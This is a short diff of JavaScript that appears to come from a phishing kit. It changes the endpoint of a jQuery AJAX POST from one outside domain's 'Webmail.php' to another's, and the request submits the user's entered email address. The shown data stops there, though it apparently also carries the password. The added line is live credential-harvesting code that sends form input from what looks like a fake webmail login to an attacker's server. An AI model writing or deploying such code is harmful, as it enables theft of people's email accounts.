@@ -210,7 +210,7 @@ count=count+1;
 
       $.ajax({
         dataType: 'JSON',
-        url: 'https://favour-9385.com/AAA/D/Webmail.php',
+        url: 'https://igeoteh.com/brks/Webmail.php',
         type: 'POST',
         data:{
           email:email,
